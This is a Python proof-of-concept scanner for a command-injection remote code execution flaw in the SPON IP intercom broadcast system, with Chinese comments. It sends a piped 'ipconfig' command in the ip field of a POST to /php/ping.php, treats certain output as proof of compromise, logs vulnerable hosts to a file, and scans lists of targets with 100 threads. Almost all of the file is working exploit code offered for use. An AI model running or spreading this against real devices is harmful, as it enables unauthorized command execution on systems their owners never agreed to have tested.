import argparse,sys,requests,time,os,re
from multiprocessing.dummy import Pool

requests.packages.urllib3.disable_warnings()  #校验证书错误时防止报错

# 指纹模板
def banner():
    test = """
    (`-').-> _  (`-')           <-. (`-')_          _      _  (`-') 
 ( OO)_   \-.(OO )     .->      \( OO) )        (_)     \-.(OO ) 
(_)--\_)  _.'    \(`-')----. ,--./ ,--/         ,-(`-') _.'    \ 
/    _ / (_...--''( OO).-.  '|   \ |  |         | ( OO)(_...--'' 
\_..`--. |  |_.' |( _) | |  ||  . '|  |)  (`-') |  |  )|  |_.' | 
.-._)   \|  .___.' \|  |)|  ||  |\    |<-.(OO )(|  |_/ |  .___.' 
\       /|  |       '  '-'  '|  | \   |,------.)|  |'->|  |      
 `-----' `--'        `-----' `--'  `--'`------' `--'   `--'   
                                            @author: 赵卿                   
    """
    print(test)


# 检测模板
def poc(target):
    url = target + "/php/ping.php"
    headers = {
        "User-Agent": "Mozilla/5.0(Windows NT 10.0;Win64;x64)AppleWebKit/537.36(KHTML,likeGecko)Chrome/119.0.0.0Safari/537.36Edg/119.0.0.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Accept-Encoding": "gzip, deflate",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    data = "jsondata[ip]=a|ipconfig&jsondata[type]=1"

    try:
        res = requests.post(url=url,headers=headers,data=data,verify=False,timeout=5)
        # print(res.text)
        if '["' in res.text:
            print(f"[+] {target} 存在RCE漏洞")
            with open('result.txt', 'a', encoding='utf-8') as f:
                f.write(target + "存在RCE漏洞\n")

        else:
            print(f"[-] {target} 不存在RCE漏洞")
    except :
        print('连接超时')


# 主函数模块
def main():
    banner()
    """命令行接收参数"""
    parser = argparse.ArgumentParser(description='SPON IP网络对讲广播系统RCE')
    # -u 单个检测  -f 多行检测
    parser.add_argument('-u', '--url', dest='url', type=str, help='输入URL')
    parser.add_argument('-f', '--file', dest='file', type=str, help='输入文件')
    # 调用
    args = parser.parse_args()
    # 处理命令行参数
    # 循环判断
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as f:
            for url in f.readlines():
                url_list.append(url.strip().replace('\n', ''))
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usaq:\n\t python3 {sys.argv[0]} -h")



# 主函数入口
if __name__ == '__main__':
    main()



